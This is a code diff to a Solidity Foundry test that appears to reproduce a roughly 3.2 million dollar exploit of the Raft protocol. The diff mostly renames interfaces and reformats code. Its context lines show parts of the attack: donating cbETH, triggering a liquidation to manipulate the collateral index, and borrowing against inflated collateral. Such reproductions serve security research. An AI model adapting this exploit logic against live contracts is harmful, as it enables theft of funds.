@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo - Total Lost : ~3.2 M USD$
 // Attacker : https://etherscan.io/address/0xc1f2b71a502b551a65eee9c96318afdd5fd439fa
@@ -64,14 +63,10 @@ interface IERC20Indexable is IERC20 {
 
 interface ICurve {
 
-    function exchange(
-        uint256 i,
-        uint256 j,
-        uint256 dx,
-        uint256 min_dy,
-        bool use_eth,
-        address receiver
-    ) external payable returns (uint256);
+    function exchange(uint256 i, uint256 j, uint256 dx, uint256 min_dy, bool use_eth, address receiver)
+        external
+        payable
+        returns (uint256);
 
 }
 
@@ -84,12 +79,12 @@ contract ContractTest is Test {
     IERC20Indexable rcbETH_c = IERC20Indexable(0xD0Db31473CaAd65428ba301D2174390d11D0C788);
     IERC20Indexable rcbETH_d = IERC20Indexable(0x7beBe1D451291099D8e05fA2676412c09C96dFbC);
     IERC20 R = IERC20(0x183015a9bA6fF60230fdEaDc3F43b3D788b13e21);
-    Uni_Pair_V3 R_USDC_Pair = Uni_Pair_V3(0x190Ed02Adaf1Ef8039fCD3f006b42553467D5045);
-    Uni_Pair_V3 WETH_USDC_Pair = Uni_Pair_V3(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);
+    IUniswapV3Pair R_USDC_Pair = IUniswapV3Pair(0x190Ed02Adaf1Ef8039fCD3f006b42553467D5045);
+    IUniswapV3Pair WETH_USDC_Pair = IUniswapV3Pair(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);
     ICurve cbETH_ETH_Pool = ICurve(0x5FAE7E604FC3e24fd43A72867ceBaC94c65b404A);
     IRaftOracle RaftOracle = IRaftOracle(0x3cd40D6e8426C9f02Fe7B23867661377E462df3d);
     IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
-    WETH9 WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+    IWETH WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     address expContract = 0x0A3340129816a86b62b7eafD61427f743c315ef8;
 
     function setUp() public {
@@ -145,7 +140,7 @@ contract ContractTest is Test {
 
         uint256 storedindex1 = rcbETH_c.currentIndex();
 
-        uint256 rcbETH_c_HeldbyAttacker = rcbETH_c.balanceOf(address(expContract)) * 1e18 / storedindex1;
+        uint256 rcbETH_c_HeldbyAttacker = (rcbETH_c.balanceOf(address(expContract)) * 1e18) / storedindex1;
 
         cbETH.transfer(address(PRM), cbETH.balanceOf(address(this))); // donate cbETH to PRM
         PRM.liquidate(liquidablePosition); // liquidate position to trigger setIndex
@@ -169,7 +164,7 @@ contract ContractTest is Test {
         uint256 collateralAmount = rcbETH_c.balanceOf(address(this));
         (uint256 EtherPirce,) = RaftOracle.fetchPrice();
         EtherPirce = EtherPirce / 1e18;
-        uint256 debtChange = collateralAmount * EtherPirce * 100 / 130 - rcbETH_d.balanceOf(address(this));
+        uint256 debtChange = (collateralAmount * EtherPirce * 100) / 130 - rcbETH_d.balanceOf(address(this));
         PRM.managePosition(cbETH, address(this), 0, true, debtChange, true, 1e18, ERC20PermitSignature); // borrow R with remaing collateral
 
         RTocbETH(); // swap R to cbETH
